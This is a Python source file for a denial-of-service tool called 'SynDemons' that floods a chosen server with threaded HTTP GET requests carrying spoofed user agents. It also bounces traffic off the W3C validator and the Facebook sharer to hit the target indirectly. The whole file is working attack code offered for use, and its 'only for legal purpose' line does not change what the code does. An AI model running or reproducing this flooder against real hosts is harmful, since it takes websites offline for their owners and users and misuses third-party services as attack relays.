#!/usr/bin/python3

# -*- coding: utf-8 -*-


# python 3 SynDemons dos Script v.1.1-demo

# by Ahura

# only for legal purpose

#This script is created with love in IRAN

#



from queue import Queue

from optparse import OptionParser

import time,sys,socket,threading,logging,urllib.request,random


def user_agent():

	global uagent

	uagent=[]
	
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1")
	
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0")
	
	uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
	
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C) FirePHP/0.5`")
	
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.1) Gecko/20100122 firefox/3.6.1")
	
	uagent.append("Mozilla/5.0 (Mobile; rv:18.0) Gecko/18.0 Firefox/18.0")
	
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36")
	
	uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0")
	
	uagent.append("Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36")
	
	uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1")
	
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246")
 
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9b3pre) Gecko/2008020509 Firefox/3.0b3pre")
	
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1b3) Gecko/20090327 Fedora/3.1-0.11.beta3.fc11 Firefox/3.1b3")
  
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")

	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")

	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")

	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	
	uagent.append("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)")
	
	return(uagent)



def my_bots():

	global bots

	bots=[]

	bots.append("http://validator.w3.org/check?uri=")

	bots.append("http://www.facebook.com/sharer/sharer.php?u=")

	return(bots)



def Demon_Killing(url):

	try:

		while True:

			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))

			print("\x1b[39mTesting The Site...\x1b[31m")

			time.sleep(.1)

	except:

		time.sleep(.1)



def down_it(item):

	try:

		while True:

			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((host,int(port)))

			if s.sendto( packet, (host, int(port)) ):

				s.shutdown(1)

				print ("\x1b[77m \x1b[77m Demons Attacked him \x1b[39m")

			else:

				s.shutdown(1)

				print("\x1b[91mshut<->down\x1b[31m")

			time.sleep(.1)

	except socket.error as e:

		print("\x1b[91Website is down no ping recieved Demons Killed \x1b[32m")

		#print("\033[91m",e,"\033[0m")

		time.sleep(.1)



def dos():

	while True:

		item = q.get()

		down_it(item)

		q.task_done()



def dos2():

	while True:

		item=w.get()

		Demon_Killing(random.choice(bots)+"http://"+host)

		w.task_done()



def usage():

	print (''' \x1b[31m
___________________________________

█▀▀ █▀▀▄ █▀▀ █▀▄▀█ █▀▀█ █▀▀▄
▀▀█ █░░█ █▀▀ █░▀░█ █░░█ █░░█
▀▀▀ ▀▀▀░ ▀▀▀ ▀░░░▀ ▀▀▀▀ ▀░░▀
___________________________________
	New Version:
 ~1 Stronger Bots
	~2 Better Design 
	~3 Stronger Than any DOS script
	  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-
	
	SYNDemons dos Script v.1-Alpha by ahura

Usage \Hidden/

\x1b[95m''')

	sys.exit()



def get_parameters():

	global host

	global port

	global thr

	global item

	optp = OptionParser(add_help_option=False,epilog="Demons")

	optp.add_option("--quiet","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)

	optp.add_option("--server","--server", dest="host",help="attack to server ip")

	optp.add_option("--port","--port",type="int",dest="port",help="-p 80 default 80")

	optp.add_option("--thread","--turbo",type="int",dest="turbo",help="default 500 -t 900")

	optp.add_option("--help","--help",dest="help",action='store_true',help="help you")

	opts, args = optp.parse_args()

	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')

	if opts.help:

		usage()

	if opts.host is not None:

		host = opts.host

	else:

		usage()

	if opts.port is None:

		port = 80

	else:

		port = opts.port

	if opts.turbo is None:

		thr = 500

	else:

		thr = opts.turbo



# reading headers

global data

headers = open("headers.txt", "r")

data = headers.read()

headers.close()

#task queue are q,w

q = Queue()

w = Queue()



if __name__ == '__main__':

	if len(sys.argv) < 2:

		usage()

	get_parameters()

	print("\x1b[31m",host," port ",str(port)," thread ",str(thr),"\x1b[31m")

	print (''' \x1b[31m
___________________________________

█▀▀ █▀▀▄ █▀▀ █▀▄▀█ █▀▀█ █▀▀▄
▀▀█ █░░█ █▀▀ █░▀░█ █░░█ █░░█
▀▀▀ ▀▀▀░ ▀▀▀ ▀░░░▀ ▀▀▀▀ ▀░░▀
___________________________________
	New Version:
 ~1 NEw UAG
	  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-
	
	SYNDemons dos Script v.1.1-demo by ahura

Usage \Hidden/

\x1b[95m''')

	user_agent()

	my_bots()

	time.sleep(5)

	try:

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		s.connect((host,int(port)))

		s.settimeout(1)

	except socket.error as e:

		print("\x1b[91mserver offe ya ipt block shde\x1b[38m")

		usage()

	while True:

		for i in range(int(thr)):

			t = threading.Thread(target=dos)

			t.daemon = True # if thread is exist, it dies

			t.start()

			t2 = threading.Thread(target=dos2)

			t2.daemon = True # if thread is exist, it dies

			t2.start()

		start = time.time()

		#tas
		

		item = 0

		while True:

			if (item>1800): # for no memory crash

				item=0

				time.sleep(.1)

			item = item + 1

			q.put(item)

			w.put(item)

		q.join()

		w.join()

